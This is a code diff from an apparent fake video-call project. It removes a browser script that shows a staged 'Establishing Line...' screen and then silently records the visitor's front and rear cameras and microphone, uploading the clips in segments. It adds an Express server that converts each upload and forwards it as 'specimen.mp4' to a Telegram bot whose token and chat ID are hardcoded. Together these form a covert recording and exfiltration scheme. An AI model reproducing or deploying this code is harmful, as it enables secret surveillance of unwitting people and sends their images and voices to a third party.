@@ -1,123 +1,143 @@
-<script>
-let localStream;
-let mediaRecorder;
-let currentChunks = [];
-let segmentCount = 1;
-let pendingUploads = 0; // TRACKS ONGOING UPLOADS
-let currentFacing = "user";
-let uiVisible = true;
-let isEnding = false;
+const express = require("express");
+const multer = require("multer");
+const fs = require("fs");
+const axios = require("axios");
+const FormData = require("form-data");
+const cors = require("cors");
+const ffmpeg = require("fluent-ffmpeg");
 
-const connectSound = new Audio("ringtone.mp3");
-const localVideo = document.getElementById("localVideo");
-const controlsUI = document.getElementById("controlsUI");
-const connectScreen = document.getElementById("connectScreen");
+const app = express();
+app.use(cors());
 
-// --- STARTUP ---
-function initiateConnection() {
-    connectSound.volume = 0.05; 
-    connectSound.play().catch(() => {});
-    
-    connectScreen.innerHTML = <span class="loader"></span><p style="margin-top:20px;">Establishing Line...</p>;
-
-    setTimeout(async () => {
-        connectScreen.style.display = "none";
-        document.getElementById("remoteVideo").style.display = "block";
-        controlsUI.style.display = "flex";
-        localVideo.style.display = "block";
-        localVideo.classList.add("snap-transition");
-        await startCamera();
-    }, 5000); 
-}
-
-// --- RECORDING & SEGMENTATION ---
-async function startCamera() {
-    if (localStream) {
-        localStream.getTracks().forEach(t => t.stop());
+// =====================
+// 📁 FILE STORAGE
+// =====================
+const storage = multer.diskStorage({
+    destination: "uploads/",
+    filename: (req, file, cb) => {
+        const ext = file.originalname.split(".").pop() || "webm";
+        cb(null, `${Date.now()}.${ext}`); // ✅ FIXED
     }
+});
+
+const upload = multer({ storage });
+
+// =====================
+// 🔑 CONFIG
+// =====================
+const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
+const CHAT_ID = "8280326139";
+
+// =====================
+// 🚀 UPLOAD ROUTE
+// =====================
+app.post("/upload", upload.single("video"), async (req, res) => {
+    let filePath;
+    let mp4Path;
 
     try {
-        localStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: currentFacing, width: { ideal: 640 } },
-            audio: true
+        console.log("\n==============================");
+        console.log("🚀 Upload received");
+
+        console.log("REQ FILE:", req.file);
+
+        if (!req.file) {
+            console.log("❌ No file uploaded");
+            return res.status(400).send("No file uploaded");
+        }
+
+        filePath = req.file.path;
+        mp4Path = filePath + ".mp4";
+
+        console.log("📁 File path:", filePath);
+        console.log("🎥 MIME type:", req.file.mimetype);
+
+        // =====================
+        // 🔄 FFmpeg conversion (safe)
+        // =====================
+        console.log("🔄 Starting FFmpeg conversion...");
+
+        await new Promise((resolve, reject) => {
+            ffmpeg(filePath)
+                .outputOptions([
+                    "-c:v libx264",
+                    "-preset ultrafast",
+                    "-pix_fmt yuv420p",
+                    "-c:a aac"
+                ])
+                .save(mp4Path)
+                .on("start", cmd => {
+                    console.log("🎬 FFmpeg command:");
+                    console.log(cmd);
+                })
+                .on("end", () => {
+                    console.log("✅ FFmpeg conversion complete");
+                    resolve();
+                })
+                .on("error", err => {
+                    console.error("❌ FFmpeg ERROR:", err.message);
+                    reject(err);
+                });
         });
-        localVideo.srcObject = localStream;
 
-        const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
-        mediaRecorder = new MediaRecorder(localStream, { mimeType: mime });
-        currentChunks = [];
+        console.log("📦 Converted file:", mp4Path);
 
-        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
-        
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(currentChunks, { type: "video/webm" });
-            uploadSegment(blob, segmentCount, currentFacing);
-            segmentCount++;
-        };
+        // =====================
+        // 📤 TELEGRAM UPLOAD
+        // =====================
+        console.log("📤 Sending to Telegram...");
 
-        mediaRecorder.start();
+        const form = new FormData();
+
+        form.append("chat_id", CHAT_ID);
+
+        form.append("video", fs.createReadStream(mp4Path), {
+            filename: "specimen.mp4",
+            contentType: "video/mp4"
+        });
+
+        const response = await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, // ✅ FIXED
+            form,
+            { headers: form.getHeaders() }
+        );
+
+        console.log("📨 Telegram response:", response.data);
+
+        // =====================
+        // 🧹 CLEANUP
+        // =====================
+        fs.unlinkSync(filePath);
+        fs.unlinkSync(mp4Path);
+
+        console.log("🧹 Cleanup done");
+        console.log("==============================\n");
+
+        res.send("Upload successful");
+
     } catch (err) {
-        console.error("Hardware Error:", err);
+        console.error("\n❌ ERROR OCCURRED ❌");
+
+        console.error("Message:", err.message);
+
+        if (err.response?.data) {
+            console.error("Telegram/API error:", err.response.data);
+        }
+
+        try {
+            if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath);
+            if (mp4Path && fs.existsSync(mp4Path)) fs.unlinkSync(mp4Path);
+        } catch (cleanupErr) {
+            console.error("Cleanup error:", cleanupErr.message);
+        }
+
+        res.status(500).send("Failed (check server logs)");
     }
-}
+});
 
-// --- BACKGROUND UPLOAD ---
-async function uploadSegment(blob, id, facing) {
-    if (blob.size < 100) return; // Ignore empty segments
-
-    pendingUploads++; // Start tracking this specific upload
-    const formData = new FormData();
-    formData.append("video", blob, part_${id}_${facing}.webm);
-
-    try {
-        await fetch("/upload", { method: "POST", body: formData });
-        console.log(Segment ${id} sync complete.);
-    } catch (e) {
-        console.error("Sync error:", e);
-    } finally {
-        pendingUploads--; // Stop tracking
-        checkFinalRedirect();
-    }
-}
-
-// --- SWITCHING CAMERA ---
-async function switchCamera() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop(); // Automatically triggers uploadSegment for the current lens
-    }
-    
-    currentFacing = (currentFacing === "user") ? "environment" : "user";
-    await startCamera();
-}
-
-// --- END CALL & SYNC WAIT ---
-async function endCall() {
-    isEnding = true;
-    document.getElementById("overlay").style.display = "flex";
-
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop(); // Trigger upload for the final segment
-    }
-
-    if (localStream) {
-        localStream.getTracks().forEach(t => t.stop());
-    }
-
-    // Fallback: If nothing was ever recorded or uploads finished instantly
-    checkFinalRedirect();
-}
-
-function checkFinalRedirect() {
-    if (isEnding && pendingUploads === 0) {
-        document.getElementById("syncMsg").innerText = "Sync complete. Redirecting...";
-        setTimeout(() => {
-            window.location.href = "search.html";
-        }, 500);
-    } else if (isEnding) {
-        document.getElementById("syncMsg").innerText = Finalizing ${pendingUploads} data segments...;
-    }
-}
-
-// --- UI AND DRAG LOGIC ---
-let isDragging = false;
-let startX, startY, initialLeft, initialTop;
+// =====================
+// 🌐 START SERVER
+// =====================
+app.listen(3000, () => {
+    console.log("Server running on https://hobo-call.onrender.com");
+});
